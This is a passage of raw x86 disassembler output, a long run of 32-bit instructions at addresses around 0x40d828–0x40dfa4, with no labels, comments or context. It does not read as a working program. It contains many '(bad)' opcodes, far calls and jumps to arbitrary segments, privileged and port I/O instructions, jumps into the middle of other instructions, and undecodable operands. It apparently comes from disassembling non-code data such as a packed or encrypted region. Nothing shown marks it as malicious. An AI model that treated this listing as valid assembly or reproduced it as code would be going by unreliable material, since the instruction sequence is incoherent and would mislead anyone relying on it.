  40d828:	into   
  40d829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d82a:	addr16 push 0x65
  40d82d:	lar    edi,WORD PTR [edi-0x20720394]
  40d834:	or     dh,bh
  40d836:	jno    0x40d847
  40d838:	add    dh,BYTE PTR [edi+0x7451612c]
  40d83e:	call   0x8650:0x885a2548
  40d845:	(bad)  
  40d846:	stos   DWORD PTR es:[edi],eax
  40d847:	repnz (bad) 
  40d849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d84a:	adc    dh,BYTE PTR [edi-0x5c]
  40d84d:	sar    bh,1
  40d84f:	cmc    
  40d850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d851:	fst    QWORD PTR [ebp-0x271f1ec3]
  40d857:	(bad)  
  40d858:	clc    
  40d859:	or     BYTE PTR [edi+ebx*8+0x11],dl
  40d85d:	cli    
  40d85e:	sbb    edi,DWORD PTR [edx-0x396b8acc]
  40d864:	rol    BYTE PTR [ebp-0x75],1
  40d867:	cwde   
  40d868:	add    DWORD PTR cs:[esp+edx*2-0x3],esi
  40d86d:	or     esi,DWORD PTR [eax-0x31]
  40d870:	rcl    BYTE PTR [ecx],0xda
  40d873:	retf   
  40d874:	test   BYTE PTR [ebp-0x60],cl
  40d877:	mov    ebx,0x7236308d
  40d87c:	jns    0x40d8aa
  40d87e:	ins    DWORD PTR es:[edi],dx
  40d87f:	jecxz  0x40d858
  40d881:	(bad)  
  40d882:	js     0x40d810
  40d884:	scas   al,BYTE PTR es:[edi]
  40d885:	xchg   esp,eax
  40d886:	jne    0x40d8a2
  40d888:	or     ch,BYTE PTR [ecx+0x2]
  40d88b:	dec    esp
  40d88c:	imul   ebx,DWORD PTR [ebp-0x23],0xffffffa2
  40d890:	inc    esp
  40d891:	pop    edi
  40d892:	dec    edx
  40d893:	inc    ebp
  40d894:	jb     0x40d825
  40d896:	sahf   
  40d897:	ret    0xd94
  40d89a:	ja     0x40d91a
  40d89c:	mov    al,BYTE PTR [esi+0x1]
  40d89f:	repz cmp edx,DWORD PTR [edx-0x50ecb50d]
  40d8a6:	aas    
  40d8a7:	push   esp
  40d8a8:	test   edx,0x1b9ff7c5
  40d8ae:	xchg   esp,eax
  40d8af:	(bad)  
  40d8b0:	cmp    al,0xb2
  40d8b2:	inc    eax
  40d8b3:	sbb    DWORD PTR [ebp+ebx*8-0x66],0x802f3ca
  40d8bb:	les    esp,FWORD PTR [ebp+0x34]
  40d8be:	mov    ds:0x2e1dbf0d,al
  40d8c3:	mov    eax,ds:0xb63bc63d
  40d8c8:	add    eax,esi
  40d8ca:	(bad)  
  40d8cb:	push   cs
  40d8cc:	mov    ebp,0x1aabab68
  40d8d1:	sbb    BYTE PTR [edx+0x3a],ch
  40d8d4:	and    DWORD PTR [esi],ebp
  40d8d6:	retf   
  40d8d7:	push   0xaa570f9f
  40d8dc:	xlat   BYTE PTR ds:[ebx]
  40d8dd:	jbe    0x40d906
  40d8df:	pop    eax
  40d8e0:	push   edi
  40d8e1:	mov    ds:0x5f7818e1,al
  40d8e6:	cdq    
  40d8e7:	add    BYTE PTR [eax],ah
  40d8e9:	or     BYTE PTR [edx+edi*1-0x62],0x69
  40d8ee:	jmp    0xef2b:0x65ff1df5
  40d8f5:	sti    
  40d8f6:	fidiv  DWORD PTR [edi]
  40d8f8:	ror    BYTE PTR ds:[ebx+ebp*8-0x71],1
  40d8fd:	adc    DWORD PTR [edi-0x72],edi
  40d900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d901:	pop    ecx
  40d902:	daa    
  40d903:	pop    edi
  40d904:	sbb    edi,esi
  40d906:	adc    eax,0x8e72e948
  40d90b:	sahf   
  40d90c:	inc    esi
  40d90d:	mov    ch,0x9b
  40d90f:	mov    cl,0xa
  40d911:	pop    ss
  40d912:	repnz sub dl,BYTE PTR [eax]
  40d915:	mov    ebx,0x513387ca
  40d91a:	ror    DWORD PTR [edx],0xcd
  40d91d:	xchg   esi,eax
  40d91e:	call   0x5e458cfb
  40d923:	fdiv   QWORD PTR [eax+0xda25642]
  40d929:	or     BYTE PTR [ebx-0x5c697072],bh
  40d92f:	(bad)  
  40d931:	sub    al,0xb3
  40d933:	sbb    eax,0xc09dc39a
  40d938:	inc    eax
  40d939:	xor    edx,DWORD PTR [ebx+eax*2+0x4ea0843c]
  40d940:	cmp    eax,0x61321c58
  40d945:	test   eax,0x1570b094
  40d94a:	mov    ch,0x32
  40d94c:	and    eax,0x2d45f5c1
  40d951:	lods   eax,DWORD PTR ds:[esi]
  40d952:	fistp  DWORD PTR [ebx]
  40d954:	in     al,0x93
  40d956:	ds adc eax,0xfda4dbab
  40d95c:	xchg   esi,eax
  40d95d:	lds    ecx,FWORD PTR [edi+0x15]
  40d960:	pop    ebx
  40d961:	inc    edi
  40d962:	ja     0x40d951
  40d964:	xchg   BYTE PTR [edx],ah
  40d966:	popa   
  40d967:	mov    dh,0x2e
  40d969:	add    DWORD PTR [ecx+0x28f670e6],ecx
  40d96f:	inc    eax
  40d970:	stc    
  40d971:	mov    esp,0xca1a112c
  40d976:	lahf   
  40d977:	sbb    esi,ebp
  40d979:	jle    0x40d9e4
  40d97b:	sbb    BYTE PTR [ebx+eax*1+0x5c3bbfa5],bh
  40d982:	ror    BYTE PTR [edx],1
  40d984:	sbb    ch,bl
  40d986:	sbb    DWORD PTR [edx+0x1bfe9211],ebp
  40d98c:	ins    DWORD PTR es:[edi],dx
  40d98d:	jl     0x40d9af
  40d98f:	retf   0x6e54
  40d992:	mov    WORD PTR [ecx+esi*1],?
  40d995:	adc    eax,0xe7214d87
  40d99a:	xor    eax,DWORD PTR [esi-0x1583f119]
  40d9a0:	ins    DWORD PTR es:[edi],dx
  40d9a1:	test   eax,0x160f4f14
  40d9a6:	mov    BYTE PTR [ebx+edi*8-0x31],ch
  40d9aa:	and    al,0x81
  40d9ac:	sti    
  40d9ad:	ins    BYTE PTR es:[edi],dx
  40d9ae:	add    al,BYTE PTR [ebp+0x5d]
  40d9b1:	in     eax,dx
  40d9b2:	dec    edx
  40d9b3:	daa    
  40d9b4:	sub    BYTE PTR [esi-0x48],cl
  40d9b7:	and    al,0x9c
  40d9b9:	xor    DWORD PTR [ebp+0x4c],ebp
  40d9bc:	or     BYTE PTR [ecx+0x6e],al
  40d9bf:	aaa    
  40d9c0:	fcmovb st,st(1)
  40d9c2:	pop    edi
  40d9c3:	add    BYTE PTR [eax+0x3c],0x66
  40d9c7:	das    
  40d9c8:	mov    dl,0x1d
  40d9ca:	je     0x40d9f3
  40d9cc:	enter  0xdc76,0x5f
  40d9d0:	sbb    esp,esi
  40d9d2:	jo     0x40d9ed
  40d9d4:	arpl   dx,ax
  40d9d6:	test   DWORD PTR [edx+eiz*2],esp
  40d9d9:	fnstenv gs:[esp+ebx*4+0x69]
  40d9de:	adc    ebp,ecx
  40d9e0:	jp     0x40d99c
  40d9e2:	cmp    al,0x30
  40d9e4:	xor    eax,0x68a15181
  40d9e9:	cmp    esp,DWORD PTR [eax+0x45b4e9eb]
  40d9ef:	int    0xfc
  40d9f1:	pusha  
  40d9f2:	inc    edi
  40d9f3:	fsubr  DWORD PTR [ebp-0x54ce0481]
  40d9f9:	add    esp,DWORD PTR [eax]
  40d9fb:	inc    ebp
  40d9fc:	aad    0x26
  40d9fe:	rol    DWORD PTR [ebp+0x361892c1],1
  40da04:	xchg   edi,eax
  40da05:	out    dx,eax
  40da06:	cwde   
  40da07:	ja     0x40da11
  40da09:	bound  ebp,QWORD PTR [edi]
  40da0b:	inc    edi
  40da0c:	nop
  40da0d:	add    BYTE PTR [eax+0x677e8410],ah
  40da13:	jl     0x40da3f
  40da15:	mov    bl,0xac
  40da17:	pop    ds
  40da18:	inc    ebx
  40da19:	pushf  
  40da1a:	int    0x49
  40da1c:	in     eax,dx
  40da1d:	hlt    
  40da1e:	inc    eax
  40da1f:	mov    ecx,0x79f74041
  40da24:	je     0x40d9b1
  40da26:	or     al,0x1d
  40da28:	mov    dl,0x84
  40da2a:	pop    ecx
  40da2b:	scas   eax,DWORD PTR es:[edi]
  40da2c:	ds mov edi,0x84c66271
  40da32:	sub    DWORD PTR [ecx-0x2d],esi
  40da35:	mov    ecx,DWORD PTR [eax]
  40da37:	jl     0x40da36
  40da39:	inc    eax
  40da3a:	or     eax,0x10e788d6
  40da3f:	icebp  
  40da40:	mov    bh,0xc
  40da42:	repz pop esp
  40da44:	retf   
  40da45:	adc    DWORD PTR [ecx-0x31],0xb6b12dff
  40da4c:	je     0x40d9df
  40da4e:	sub    dl,BYTE PTR [edx+0x391a834d]
  40da54:	js     0x40dab2
  40da56:	jg     0x40da31
  40da58:	adc    edi,0x1d256489
  40da5e:	xchg   edx,eax
  40da5f:	cmp    eax,0x7da8e8ed
  40da64:	dec    ebx
  40da65:	arpl   WORD PTR [ebp-0x78],dx
  40da68:	shr    BYTE PTR [eax-0x58],0xba
  40da6c:	mov    esp,0xd9075ded
  40da71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da72:	or     eax,0x7ca3513b
  40da77:	and    eax,0xc62d918a
  40da7c:	jle    0x40daa3
  40da7e:	adc    al,0x8b
  40da80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da81:	ins    DWORD PTR es:[edi],dx
  40da82:	cmp    eax,0x37bd06e2
  40da87:	xor    ch,0xcb
  40da8a:	loope  0x40dabb
  40da8c:	push   esi
  40da8d:	leave  
  40da8e:	ins    BYTE PTR es:[edi],dx
  40da8f:	cmp    eax,0xba2c3507
  40da94:	pop    esi
  40da95:	cmp    BYTE PTR [esi+0x5cac38df],dh
  40da9b:	xor    eax,0x77480cfe
  40daa0:	push   ebp
  40daa1:	aam    0x6e
  40daa3:	add    BYTE PTR [edi],bh
  40daa5:	sar    DWORD PTR es:[eax+0x31d89d13],cl
  40daac:	sub    BYTE PTR [edi-0x204755df],ch
  40dab2:	ficom  WORD PTR [edx]
  40dab4:	loope  0x40da86
  40dab6:	fsub   QWORD PTR [esi]
  40dab8:	sub    al,0x1b
  40daba:	jne    0x40daba
  40dabc:	idiv   DWORD PTR [edx-0x72]
  40dabf:	sbb    eax,0xb1e9880c
  40dac4:	push   ecx
  40dac5:	sbb    ebx,esi
  40dac7:	lods   al,BYTE PTR ds:[esi]
  40dac8:	repnz out dx,al
  40daca:	inc    edx
  40dacb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dacc:	lods   eax,DWORD PTR ds:[esi]
  40dacd:	out    0x88,al
  40dacf:	mov    eax,ds:0x4f38c43
  40dad4:	xchg   edx,eax
  40dad5:	dec    ecx
  40dad6:	cmc    
  40dad7:	in     al,0x6f
  40dad9:	jecxz  0x40dadc
  40dadb:	jl     0x40da6c
  40dadd:	loope  0x40db16
  40dadf:	mov    dl,0x3c
  40dae1:	outs   dx,BYTE PTR ds:[esi]
  40dae2:	je     0x40da9e
  40dae4:	jl     0x40da76
  40dae6:	push   ds
  40dae7:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dae9:	push   esi
  40daea:	and    BYTE PTR [edi+0x36],ch
  40daed:	outs   dx,DWORD PTR ds:[esi]
  40daee:	popf   
  40daef:	addr16 push cs
  40daf1:	and    BYTE PTR [ebx-0x44],ah
  40daf4:	sub    edi,DWORD PTR es:[edx]
  40daf7:	mov    BYTE PTR ds:0x1cf64123,cl
  40dafd:	inc    ebp
  40dafe:	adc    al,0x90
  40db00:	xchg   ebp,eax
  40db01:	retf   0x1994
  40db04:	and    edi,DWORD PTR [edx+0x69]
  40db07:	and    ch,BYTE PTR [edx-0x5f]
  40db0a:	pusha  
  40db0b:	test   BYTE PTR [ebx],0x9f
  40db0e:	mov    ah,0x57
  40db10:	neg    DWORD PTR [esp+eiz*8-0x16]
  40db14:	add    eax,0x26e4ad5f
  40db19:	push   es
  40db1a:	mov    dl,0x53
  40db1c:	popf   
  40db1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db1e:	jl     0x40daf6
  40db20:	sub    eax,0xd97742b8
  40db25:	stc    
  40db26:	in     al,0xe7
  40db28:	sahf   
  40db29:	sbb    ebx,DWORD PTR [eax]
  40db2b:	fwait
  40db2c:	mov    edi,0xd26f59b0
  40db31:	xor    DWORD PTR [esi+esi*1+0x6d],esi
  40db35:	lahf   
  40db36:	nop
  40db37:	push   edi
  40db38:	push   edx
  40db39:	mov    gs,WORD PTR [eax]
  40db3b:	jecxz  0x40dba8
  40db3d:	lahf   
  40db3e:	fwait
  40db3f:	dec    edx
  40db40:	ret    
  40db41:	cmp    eax,0xdfdab5d1
  40db46:	out    0x1c,eax
  40db48:	(bad)  
  40db49:	and    dh,dl
  40db4b:	(bad)  
  40db4c:	les    ebp,FWORD PTR ds:0x12aacb2c
  40db52:	je     0x40dba1
  40db54:	sbb    esp,DWORD PTR [edx-0x7d7465e]
  40db5a:	xor    bl,ch
  40db5c:	jb     0x40db39
  40db5e:	int    0x7c
  40db60:	je     0x40db6c
  40db62:	cmp    BYTE PTR fs:[esi-0x59],ah
  40db66:	inc    edx
  40db67:	call   0xc56c:0x3cfc69d5
  40db6e:	inc    ebp
  40db6f:	and    eax,DWORD PTR [esi+0x7dd80f84]
  40db75:	dec    edx
  40db77:	nop
  40db78:	sub    eax,DWORD PTR [edx+0x40]
  40db7b:	or     DWORD PTR [ecx+eiz*2-0x567ee4c1],ebp
  40db82:	mov    ah,bh
  40db84:	adc    eax,0x8b0b5e13
  40db89:	push   edx
  40db8a:	sub    eax,0xf354cc0b
  40db8f:	lock push ecx
  40db91:	nop
  40db92:	sar    BYTE PTR [esi],1
  40db94:	ins    DWORD PTR es:[edi],dx
  40db95:	cli    
  40db96:	pop    ebx
  40db97:	xchg   ebx,eax
  40db98:	jo     0x40db44
  40db9a:	jecxz  0x40db74
  40db9c:	loopne 0x40db98
  40db9e:	f2xm1  
  40dba0:	xor    bh,BYTE PTR [ebx+eiz*4]
  40dba3:	shr    BYTE PTR [si+0x79a9],1
  40dba8:	cmp    dh,BYTE PTR [edi-0x26141a3f]
  40dbae:	aad    0x71
  40dbb0:	cdq    
  40dbb1:	inc    edi
  40dbb2:	cld    
  40dbb3:	mul    BYTE PTR [esi+0x73]
  40dbb6:	jmp    0x40dc17
  40dbb8:	(bad)  
  40dbb9:	cmp    eax,0xec44d4f7
  40dbbe:	xor    ebx,esp
  40dbc0:	or     al,0xaa
  40dbc2:	inc    esi
  40dbc3:	pop    ebp
  40dbc4:	jg     0x40db8d
  40dbc6:	inc    esp
  40dbc7:	das    
  40dbc8:	or     bh,BYTE PTR [ebx-0x3f1fe356]
  40dbce:	cli    
  40dbcf:	scas   eax,DWORD PTR es:[edi]
  40dbd0:	jmp    0x895b:0x86b18175
  40dbd7:	imul   ebp,DWORD PTR [esi-0x7b],0xffffffbb
  40dbdb:	imul   eax,DWORD PTR [edx],0x67
  40dbde:	popf   
  40dbdf:	(bad)  
  40dbe0:	stc    
  40dbe1:	not    BYTE PTR [edx+0x77b6bc6a]
  40dbe7:	(bad)  
  40dbe8:	jbe    0x40dbe1
  40dbea:	pop    ebx
  40dbeb:	adc    DWORD PTR [edx-0x594d5e0],0x1b
  40dbf2:	jg     0x40dc19
  40dbf4:	mov    WORD PTR [eax],es
  40dbf6:	jecxz  0x40db97
  40dbf8:	shl    BYTE PTR [ebp+0x2d462db1],0x8b
  40dbff:	sub    dh,0xd2
  40dc02:	mov    esp,0xd7658d38
  40dc07:	aaa    
  40dc08:	inc    edx
  40dc09:	outs   dx,BYTE PTR ds:[esi]
  40dc0a:	shl    DWORD PTR [ecx],0xbf
  40dc0d:	shr    ebp,1
  40dc0f:	loope  0x40dbf5
  40dc11:	mov    ah,0x6d
  40dc13:	pushf  
  40dc14:	ins    DWORD PTR es:[edi],dx
  40dc15:	ror    DWORD PTR [edx+0x5e37568b],0x21
  40dc1c:	pop    ss
  40dc1d:	mov    ah,bl
  40dc1f:	les    esi,FWORD PTR [ebp-0x3b]
  40dc22:	ss mov eax,0x936bddbf
  40dc28:	pushf  
  40dc29:	pop    eax
  40dc2a:	jle    0x40dbe4
  40dc2c:	xor    dh,al
  40dc2e:	fidiv  WORD PTR [eax-0x2e8d9ca9]
  40dc34:	daa    
  40dc35:	jle    0x40dc04
  40dc37:	dec    ebp
  40dc38:	inc    ecx
  40dc39:	sbb    bl,bl
  40dc3b:	mov    esi,0xb9eb1892
  40dc40:	fnstenv [esp+edi*8]
  40dc43:	mov    al,ds:0x7cf447d
  40dc48:	ss fs xchg edi,eax
  40dc4b:	sub    eax,0x7411d5a0
  40dc50:	int    0xed
  40dc52:	je     0x40dbe5
  40dc54:	mov    ds:0x9f6e5c4e,eax
  40dc59:	sub    DWORD PTR [ebp-0x3ed8031d],ecx
  40dc5f:	xor    BYTE PTR [edx],ah
  40dc61:	repz sub BYTE PTR [ebx+0x73dd5a02],ch
  40dc68:	outs   dx,BYTE PTR ds:[esi]
  40dc69:	adc    eax,0xde475839
  40dc6e:	mov    edx,eax
  40dc70:	xlat   BYTE PTR ds:[ebx]
  40dc71:	xchg   esp,eax
  40dc72:	pop    eax
  40dc73:	das    
  40dc74:	xchg   esi,eax
  40dc75:	repz and edx,DWORD PTR [eax+0x51]
  40dc79:	into   
  40dc7a:	in     al,0x9b
  40dc7c:	lea    eax,[edx+0x1122c0da]
  40dc82:	jle    0x40dc29
  40dc84:	data16 sub BYTE PTR [esi-0x43b11421],0xf6
  40dc8c:	xchg   DWORD PTR [ebp-0x38],edi
  40dc8f:	push   edi
  40dc90:	add    esi,esi
  40dc92:	mov    ecx,0x11ef2a1f
  40dc97:	dec    ebx
  40dc98:	cmp    eax,0x96d63bd8
  40dc9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc9e:	enter  0x5c34,0x55
  40dca2:	out    0x2b,eax
  40dca4:	adc    al,BYTE PTR [ebx-0x10]
  40dca7:	or     BYTE PTR ds:0xa1db11c0,0xd8
  40dcae:	jl     0x40dcfd
  40dcb0:	inc    edx
  40dcb1:	(bad)  
  40dcb2:	push   ss
  40dcb3:	lock iret 
  40dcb5:	jnp    0x40dcb7
  40dcb7:	sahf   
  40dcb8:	xor    al,0x60
  40dcba:	lods   eax,DWORD PTR ds:[esi]
  40dcbb:	xor    ch,BYTE PTR [ebx+esi*2]
  40dcbe:	fbstp  TBYTE PTR [edx-0x40a21fd8]
  40dcc4:	bound  edi,QWORD PTR [edx-0x3f]
  40dcc7:	cs call 0xfca8:0xf86708e7
  40dccf:	iret   
  40dcd0:	xor    eax,0x4bdab76f
  40dcd5:	pop    ecx
  40dcd6:	jle    0x40dcee
  40dcd8:	or     BYTE PTR [eax-0x462e9977],0xa8
  40dcdf:	and    eax,0x80b0b2f5
  40dce4:	dec    ecx
  40dce5:	inc    edi
  40dce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dce7:	add    DWORD PTR [edi+0x29],0xb434fd47
  40dcee:	cmp    bl,BYTE PTR [ecx-0x741df8c5]
  40dcf4:	push   edi
  40dcf5:	sub    BYTE PTR [ebx-0x492607cd],bl
  40dcfb:	adc    eax,0x4115baad
  40dd00:	out    dx,eax
  40dd01:	in     al,0xd0
  40dd03:	in     al,0xda
  40dd05:	ret    
  40dd06:	push   ecx
  40dd07:	dec    edi
  40dd08:	or     ch,BYTE PTR [edi+0x60]
  40dd0b:	sub    edx,DWORD PTR [ebp-0x2d]
  40dd0e:	xchg   ebx,eax
  40dd0f:	jge    0x40dd41
  40dd11:	inc    edx
  40dd12:	pop    eax
  40dd13:	lds    edi,FWORD PTR [eax-0x8ecc8a6]
  40dd19:	in     eax,dx
  40dd1a:	sub    bl,bh
  40dd1c:	gs jmp 0x539c:0x6178d7fe
  40dd24:	xor    ebp,DWORD PTR [edi]
  40dd26:	xchg   BYTE PTR [esi],bh
  40dd28:	xchg   edx,eax
  40dd29:	out    0xf8,al
  40dd2b:	inc    ebx
  40dd2c:	mov    edx,DWORD PTR [esi+0x51fe20dd]
  40dd32:	lods   al,BYTE PTR ds:[esi]
  40dd33:	sbb    DWORD PTR [ebp+0x4b],esp
  40dd36:	mov    esp,DWORD PTR [ebx+0x1d4af188]
  40dd3c:	push   cs
  40dd3d:	pop    ss
  40dd3e:	in     eax,0x88
  40dd40:	and    DWORD PTR [ebp+0x70dd2c67],ecx
  40dd46:	shl    BYTE PTR [ebp+0x71],cl
  40dd49:	in     eax,dx
  40dd4a:	arpl   WORD PTR [eax-0x33],sp
  40dd4d:	jb     0x40dcd7
  40dd4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd50:	or     edx,eax
  40dd52:	mov    cl,0xf0
  40dd54:	(bad)  
  40dd55:	cmc    
  40dd56:	leave  
  40dd57:	pop    esp
  40dd58:	pop    esp
  40dd59:	mov    ds:0xa28f1db,eax
  40dd5e:	jg     0x40dd8f
  40dd60:	mov    bh,BYTE PTR [esi+0x74fb6940]
  40dd66:	sbb    BYTE PTR [ecx],cl
  40dd68:	xchg   ecx,eax
  40dd69:	sbb    al,0x47
  40dd6b:	stos   DWORD PTR es:[edi],eax
  40dd6c:	dec    ebp
  40dd6d:	and    ebx,DWORD PTR [ecx+0x4e21463]
  40dd73:	push   edx
  40dd74:	test   ch,bh
  40dd76:	pop    ebp
  40dd77:	out    0x9,al
  40dd79:	xchg   esp,eax
  40dd7a:	sbb    ah,BYTE PTR [eax-0x12]
  40dd7d:	xor    ecx,edx
  40dd7f:	cld    
  40dd80:	xor    eax,0xa92f5c0e
  40dd85:	test   al,0x4b
  40dd87:	push   0x1
  40dd89:	adc    eax,0xccafa8de
  40dd8e:	(bad)  
  40dd8f:	leave  
  40dd90:	mov    bh,dh
  40dd92:	xchg   esi,eax
  40dd93:	push   ebp
  40dd95:	call   0xc6035415
  40dd9a:	shr    ecx,cl
  40dd9c:	xchg   edx,eax
  40dd9d:	push   edi
  40dd9e:	xchg   DWORD PTR [eax],ebx
  40dda0:	cmp    DWORD PTR [edx+0x39370f8],edi
  40dda6:	mov    eax,0xdd030d30
  40ddab:	inc    ebx
  40ddac:	jne    0x40de22
  40ddae:	inc    ebp
  40ddaf:	xor    DWORD PTR [esi+0x1f2360e1],ebp
  40ddb5:	pop    edx
  40ddb6:	imul   edi,DWORD PTR [ebx],0x1f
  40ddb9:	dec    edx
  40ddba:	sbb    BYTE PTR [ecx],cl
  40ddbc:	in     al,dx
  40ddbd:	cld    
  40ddbe:	rol    DWORD PTR [esi-0x60fbec74],0x6c
  40ddc5:	add    al,0x14
  40ddc7:	in     eax,0xb4
  40ddc9:	add    BYTE PTR [esi-0x1ae50a49],cl
  40ddcf:	das    
  40ddd0:	stos   DWORD PTR es:[edi],eax
  40ddd1:	sbb    bl,BYTE PTR [ecx-0x66]
  40ddd4:	shl    edi,1
  40ddd6:	(bad)  
  40ddd7:	call   0xcbd878ad
  40dddc:	dec    ecx
  40dddd:	lds    edi,FWORD PTR [ecx+eax*1]
  40dde0:	jns    0x40de44
  40dde2:	cwde   
  40dde3:	addr16 int 0x69
  40dde6:	push   ebp
  40dde7:	clc    
  40dde8:	cld    
  40dde9:	cmc    
  40ddea:	rcl    bh,1
  40ddec:	jge    0x40de51
  40ddee:	xor    BYTE PTR [eax+ebp*4-0x6c23d7b],ch
  40ddf5:	mov    bh,0x31
  40ddf7:	aas    
  40ddf8:	dec    ebx
  40ddf9:	dec    eax
  40ddfa:	arpl   WORD PTR ds:0x7bf46a6a,ax
  40de00:	lds    ebp,FWORD PTR [esi-0x5f633578]
  40de06:	mov    bh,al
  40de08:	fs loop 0x40de25
  40de0b:	ds pop eax
  40de0d:	xlat   BYTE PTR ds:[ebx]
  40de0e:	(bad)
  40de11:	jg     0x40de7a
  40de13:	cmp    eax,DWORD PTR [esi+0x774869cc]
  40de19:	test   eax,0xad27a6fb
  40de1e:	sub    BYTE PTR [ecx-0x1ce4ac86],bh
  40de24:	jmp    0x40de0a
  40de26:	add    ebp,DWORD PTR [esi]
  40de28:	xchg   ebx,eax
  40de29:	mov    edi,0x456474b9
  40de2e:	fnstsw WORD PTR [ecx-0x42f87e0b]
  40de34:	mov    ebp,0x22242b49
  40de39:	(bad)  
  40de3a:	adc    al,0x52
  40de3c:	popa   
  40de3d:	imul   esp,DWORD PTR cs:[ebp+0xec87dad],0xdbdd8817
  40de48:	(bad)  
  40de49:	fldenv [ecx]
  40de4b:	retf   0x7ab4
  40de4e:	add    edx,DWORD PTR [esi-0x434cba54]
  40de54:	popf   
  40de55:	push   edi
  40de56:	sti    
  40de57:	jo     0x40dddc
  40de59:	lock mov BYTE PTR [eax],cl
  40de5c:	in     al,0x9a
  40de5e:	push   ecx
  40de5f:	sub    al,0xe
  40de61:	mov    ah,0xfb
  40de63:	push   0x8e189fde
  40de68:	mov    WORD PTR [ecx],es
  40de6a:	lea    eax,[ecx+0x177844b]
  40de70:	pop    eax
  40de71:	test   al,0xf
  40de73:	jg     0x40dec1
  40de75:	inc    esp
  40de76:	mov    eax,ds:0xdb5d6653
  40de7b:	xchg   ebp,eax
  40de7c:	push   esp
  40de7d:	xchg   esp,eax
  40de7e:	(bad)  
  40de7f:	cdq    
  40de80:	or     eax,0xf81e23bf
  40de85:	pusha  
  40de86:	or     eax,0x6c5d107f
  40de8b:	ins    DWORD PTR es:[edi],dx
  40de8c:	push   ebx
  40de8d:	fmul   QWORD PTR [ecx+0x6d]
  40de90:	cwde   
  40de91:	dec    eax
  40de92:	pop    edi
  40de93:	inc    esp
  40de94:	xchg   esi,eax
  40de95:	ficom  DWORD PTR [edx+0x8f2c458]
  40de9b:	or     bh,cl
  40de9d:	addr16 dec edx
  40de9f:	cld    
  40dea0:	arpl   WORD PTR [edx],sp
  40dea2:	mov    fs,WORD PTR [ebp-0x66]
  40dea5:	daa    
  40dea6:	(bad)  
  40dea7:	xor    DWORD PTR [ecx],edi
  40dea9:	pop    ebx
  40deaa:	sub    al,0x96
  40deac:	ss sbb eax,0x4b9c194
  40deb2:	fsub   st,st(3)
  40deb4:	mov    DWORD PTR [ebx-0x1d929193],eax
  40deba:	inc    ebx
  40debb:	inc    edx
  40debc:	inc    edx
  40debd:	dec    esp
  40debe:	lods   eax,DWORD PTR ds:[esi]
  40debf:	out    0x2f,al
  40dec1:	(bad)  
  40dec2:	addr16 or al,0xde
  40dec5:	mov    dl,0xa2
  40dec7:	mov    ds,WORD PTR [edx]
  40dec9:	jle    0x40df36
  40decb:	mov    dl,0xaa
  40decd:	lock dec esp
  40decf:	mov    ss,WORD PTR [ebp-0x15]
  40ded2:	imul   esp,DWORD PTR [esp+ebp*2+0x76],0xdd810f73
  40deda:	in     eax,0x57
  40dedc:	gs jg  0x40debd
  40dedf:	test   BYTE PTR [ecx+0x29adf532],0xc6
  40dee6:	adc    ah,al
  40dee8:	fsubp  st(2),st
  40deea:	sbb    edi,edx
  40deec:	xchg   ebx,eax
  40deed:	dec    edx
  40deee:	not    BYTE PTR [eax]
  40def0:	popa   
  40def1:	in     eax,dx
  40def2:	mov    BYTE PTR [ebx+0x2d84ef3],dl
  40def8:	mov    al,0x1f
  40defa:	iret   
  40defb:	dec    ebp
  40defc:	and    eax,0x498b7d83
  40df01:	rcr    DWORD PTR [eax+0x1520b381],cl
  40df07:	rol    BYTE PTR [edx+0x68fe12ec],cl
  40df0d:	mov    ch,BYTE PTR [eax]
  40df0f:	leave  
  40df10:	out    0xa6,al
  40df12:	(bad)  
  40df13:	pop    esp
  40df14:	pop    ebp
  40df15:	ret    0x7deb
  40df18:	push   eax
  40df19:	ret    
  40df1a:	rcr    DWORD PTR ds:0xfacb79a3,0xd8
  40df21:	push   ebp
  40df22:	pop    edi
  40df23:	pop    ds
  40df24:	xlat   BYTE PTR ds:[ebx]
  40df25:	test   DWORD PTR [ebp-0x7c4d65e4],eax
  40df2b:	jne    0x40dedd
  40df2d:	add    ch,BYTE PTR [edx-0x72c621e4]
  40df33:	rol    DWORD PTR [edi],cl
  40df35:	jb     0x40deed
  40df37:	jg     0x40df6a
  40df39:	pop    edx
  40df3a:	loope  0x40df8f
  40df3c:	lods   eax,DWORD PTR ds:[esi]
  40df3d:	push   ebp
  40df3e:	mov    eax,ds:0xe22cdd47
  40df43:	rol    DWORD PTR [ebp+0x59],1
  40df46:	sub    bh,ah
  40df48:	push   eax
  40df49:	jg     0x40df06
  40df4b:	add    eax,0x44b41c87
  40df50:	js     0x40dfaf
  40df52:	dec    ebx
  40df53:	cmc    
  40df54:	in     eax,dx
  40df55:	aam    0x5
  40df57:	xchg   ebp,eax
  40df58:	xor    al,0x2d
  40df5a:	adc    bl,al
  40df5c:	xchg   edi,eax
  40df5d:	lock fld TBYTE PTR [ebp+0x68d3c87b]
  40df64:	loope  0x40df88
  40df66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df67:	in     eax,dx
  40df68:	ds or  eax,0x216eae77
  40df6e:	mov    al,es:0x9e818bd4
  40df74:	pop    es
  40df75:	mov    ah,BYTE PTR [edi-0x56]
  40df78:	ins    DWORD PTR es:[edi],dx
  40df79:	shl    DWORD PTR cs:[edi],cl
  40df7c:	pop    ss
  40df7d:	test   al,0x2c
  40df7f:	adc    DWORD PTR [ebp-0x4f63eac4],ebp
  40df85:	jg     0x40df1f
  40df87:	es es add eax,0x56fc4e28
  40df8e:	xor    DWORD PTR [edi],esp
  40df90:	repnz mov WORD PTR [esi+esi*1-0x43],?
  40df95:	xchg   DWORD PTR [esi],esi
  40df97:	push   0xc932140e
  40df9c:	iret   
  40df9d:	push   ebp
  40df9e:	push   ebp
  40df9f:	fs jns 0x40df3c
  40dfa2:	leave  
  40dfa3:	pop    ebp
  40dfa4:	or     al,0x3e
